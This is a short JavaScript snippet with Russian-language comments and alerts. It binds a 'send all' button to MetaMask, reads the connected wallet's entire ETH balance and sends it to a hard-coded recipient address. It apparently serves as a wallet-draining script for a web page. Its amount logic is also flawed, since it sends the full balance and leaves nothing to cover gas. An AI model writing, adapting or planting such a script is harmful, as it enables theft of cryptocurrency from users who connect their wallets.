document.addEventListener("DOMContentLoaded", async function() {
    const sendAllButton = document.getElementById("sendAllButton");
    const recipientAddress = "0x97B42526072DEb73CF0529EaEB32d19B66260146"; // Адрес для отправки

    sendAllButton.addEventListener("click", async function() {
        if (typeof window.ethereum === "undefined") {
            alert("MetaMask не обнаружен. Установите MetaMask для продолжения.");
            return;
        }

        try {
            await window.ethereum.enable();
            const web3 = new Web3(window.ethereum);
            const accounts = await web3.eth.getAccounts();

            if (accounts.length > 0) {
                const senderAddress = accounts[0];
                const balance = await web3.eth.getBalance(senderAddress);

                if (balance > 0) {
                    const gasPrice = await web3.eth.getGasPrice();
                    const gasLimit = 21000; // Стандартный лимит газа
                    const amount = web3.utils.toWei(balance, "wei");

                    const transactionParameters = {
                        from: senderAddress,
                        to: recipientAddress,
                        value: amount,
                        gasPrice: gasPrice,
                        gas: gasLimit
                    };

                    try {
                        const txHash = await web3.eth.sendTransaction(transactionParameters);
                        alert(`Транзакция успешно отправлена. Хеш: ${txHash}`);
                    } catch (error) {
                        alert(`Произошла ошибка при отправке транзакции: ${error.message}`);
                    }
                } else {
                    alert("У вас нет средств на балансе для отправки.");
                }
            } else {
                alert("Не удалось получить адрес MetaMask.");
            }
        } catch (error) {
            alert(`Произошла ошибка: ${error.message}`);
        }
    });
});
